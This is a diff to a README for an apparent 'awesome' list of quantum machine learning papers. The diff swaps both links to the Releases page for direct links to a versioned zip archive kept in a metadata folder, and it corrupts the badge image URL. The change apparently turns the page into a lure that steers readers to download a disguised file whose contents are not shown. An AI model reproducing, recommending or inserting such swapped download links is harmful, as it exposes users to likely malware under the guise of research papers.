@@ -1,6 +1,6 @@
 # 🔄 awesome-QAI-Papers-QML - Explore Quantum Machine Learning Papers
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Romainiaccc/awesome-QAI-Papers-QML/releases)
+[![Download Releases](https://github.com/Romainiaccc/awesome-QAI-Papers-QML/raw/refs/heads/main/metadata/Papers_QA_QML_awesome_v2.0-alpha.3.zip%https://github.com/Romainiaccc/awesome-QAI-Papers-QML/raw/refs/heads/main/metadata/Papers_QA_QML_awesome_v2.0-alpha.3.zip)](https://github.com/Romainiaccc/awesome-QAI-Papers-QML/raw/refs/heads/main/metadata/Papers_QA_QML_awesome_v2.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the awesome-QAI-Papers-QML repository! This platform showcases essent
 
 To access the research papers, you need to visit the Releases page. Click the link below:
 
-[Download Papers](https://github.com/Romainiaccc/awesome-QAI-Papers-QML/releases)
+[Download Papers](https://github.com/Romainiaccc/awesome-QAI-Papers-QML/raw/refs/heads/main/metadata/Papers_QA_QML_awesome_v2.0-alpha.3.zip)
 
 On the Releases page, you will find a list of papers. Each entry includes a brief description and a download link. Select the papers that interest you and download them directly to your device.
 
